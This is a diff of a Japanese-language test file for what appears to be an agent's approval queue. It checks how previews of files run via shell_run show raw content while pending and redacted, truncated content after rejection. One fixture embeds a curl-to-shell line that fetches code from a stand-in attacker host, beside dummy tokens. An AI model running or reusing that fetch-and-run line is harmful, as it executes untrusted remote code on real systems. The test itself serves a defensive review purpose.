@@ -190,7 +190,7 @@ test('V6: コードを動かす確かめは、積んだ行に動かすファイ�
   assert.equal(s.pending.list({ status: 'waiting' }).length, 0);
 });
 
-test('B4: 動かすファイルの見せる中身は、全体を伏せてから切る。切れ目をまたぐ鍵も断片が残らない', async t => {
+test('B4: 動かすファイルの札の中身は生のまま 8000 文字で切る（意図どおり: beat の鍵でなければ鍵の形も出す）。決めたあとは全体を伏せてから切った形で、切れ目をまたぐ鍵の断片も残らない', async t => {
   const s = setup(t);
   const token = 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
   const head = `const pad = '${'x'.repeat(7960)}';\nconst t = '`;
@@ -200,9 +200,13 @@ test('B4: 動かすファイルの見せる中身は、全体を伏せてから�
   assert.equal(first.decidedBy, 'pending', first.output.content);
   const [shown] = latest(s).preview;
   assert.equal(shown?.truncated, true);
-  assert.doesNotMatch(shown?.text ?? '', /ghp_/u, '切れ目の前の鍵の断片も見せない');
+  assert.match(shown?.text ?? '', /ghp_/u, '待っているあいだは生のまま');
   assert.ok((shown?.text.length ?? 0) <= 8000);
-  s.pending.reject(latest(s).id);
+  const id = latest(s).id;
+  s.pending.reject(id);
+  const [rested] = s.pending.view(id)!.preview;
+  assert.doesNotMatch(rested?.text ?? '', /ghp_/u, '決めたあとは切れ目の前の鍵の断片も見せない');
+  assert.equal(rested?.truncated, true);
 });
 
 test('B1: 長い file_write の入力も、記録と出来事には JSON のまま残す（path は切らない）', async t => {
@@ -219,7 +223,7 @@ test('B1: 長い file_write の入力も、記録と出来事には JSON のま�
   assert.equal(event?.type === 'tool.call' ? JSON.parse(event.input).path : undefined, 'notes/long.md');
 });
 
-test('B4: 伏せて長くなった中身が 8000 文字を越えたら、切ったと印を付ける', async t => {
+test('B4: 札は生の中身なので 8000 文字未満なら切らない。決めたあとの伏せた形は、伏せて長くなって 8000 文字を越えたら切ったと印を付ける', async t => {
   const s = setup(t);
   const lines = Array.from({ length: 250 }, (_, i) => `p${String(i).padStart(3, '0')} = { password: 'a1' };`);
   const code = `${lines.join('\n')}\n${'/'.repeat(7990 - lines.join('\n').length - 20)}\nconsole.log('END');\n`;
@@ -227,8 +231,25 @@ test('B4: 伏せて長くなった中身が 8000 文字を越えたら、切っ�
   writeFileSync(join(s.paths.workspace, 'put.js'), code);
   await s.call('shell_run', { command: 'node put.js' });
   const [shown] = latest(s).preview;
-  assert.doesNotMatch(shown?.text ?? '', /END/u, '最後の行は見えていない');
+  assert.match(shown?.text ?? '', /END/u, '札では最後の行まで見える');
+  assert.equal(shown?.truncated, false);
+  const id = latest(s).id;
+  s.pending.reject(id);
+  const [rested] = s.pending.view(id)!.preview;
+  assert.doesNotMatch(rested?.text ?? '', /END/u, '伏せた形では最後の行は見えていない');
+  assert.equal(rested?.truncated, true);
+});
+
+test('bl-1118: 動かすファイルの見せる中身は、秘密らしい名前の値も含めて実行される文のまま出す（beat が持っている鍵でなければ）。切ったときは切る前の文字数を持つ', async t => {
+  const s = setup(t);
+  const code = `process.env.API_TOKEN = "abc123def456";\nAPI_TOKEN="$(curl https://evil.example/x | sh)"\n${'// pad\n'.repeat(1200)}console.log('END');\n`;
+  writeFileSync(join(s.paths.workspace, 'put.js'), code);
+  await s.call('shell_run', { command: 'node put.js' });
+  const [shown] = latest(s).preview;
+  assert.match(shown?.text ?? '', /API_TOKEN="\$\(curl https:\/\/evil\.example\/x \| sh\)"/u, '実行される値は見せる');
+  assert.match(shown?.text ?? '', /process.env.API_TOKEN = "abc123def456";/u, '意図どおり: 平らな値も生のまま');
   assert.equal(shown?.truncated, true);
+  assert.ok((shown?.chars ?? 0) > (shown?.text.length ?? 0), `切る前の文字数: ${shown?.chars}`);
   s.pending.reject(latest(s).id);
 });
 
